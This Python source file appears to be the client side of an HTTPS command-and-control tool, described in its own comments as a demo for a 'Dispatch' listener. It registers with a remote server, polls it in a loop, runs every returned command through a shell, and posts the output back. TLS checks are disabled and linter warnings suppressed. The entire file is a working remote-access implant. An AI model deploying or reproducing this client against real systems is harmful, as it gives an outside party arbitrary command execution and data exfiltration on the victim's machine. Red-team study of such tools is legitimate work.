import requests
import time
import subprocess
import urllib3
import argparse
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def register(server_url):
    try:
        # Demo client talks to the self-signed Dispatch listener.
        requests.post(f"{server_url}/register", data="hi", verify=False, timeout=10)  # noqa: S501
        print("[*] Registered with server.")
    except Exception as e:
        print("Failed to register:", e)
        sys.exit(1)

def poll(server_url, interval=0):
    while True:
        try:
            r = requests.get(f"{server_url}/data", verify=False, timeout=10)  # noqa: S501
            cmd = r.text.strip()

            if cmd:
                print(f"[+] Got command: {cmd}")

                # Handle shutdown from server
                if cmd.lower() == "exit":
                    print("[*] Received exit signal. Shutting down.")
                    return

                try:
                    # Demo client runs the command text returned by the server.
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)  # noqa: S602
                except subprocess.CalledProcessError as e:
                    output = e.output

                requests.post(f"{server_url}/data", data=output.decode(), verify=False, timeout=10)  # noqa: S501

        except Exception as e:
            print("[!] Error polling server:", e)

        time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Connect to HTTPS command server.")
    parser.add_argument('--url', dest='server', required=True, help='Full server URL, e.g., https://192.168.1.5:8443')
    parser.add_argument('--sleep', type=int, default=0, required=False, help='Polling interval in seconds (default: 0)')
    args = parser.parse_args()

    register(args.server)
    poll(args.server, args.sleep)
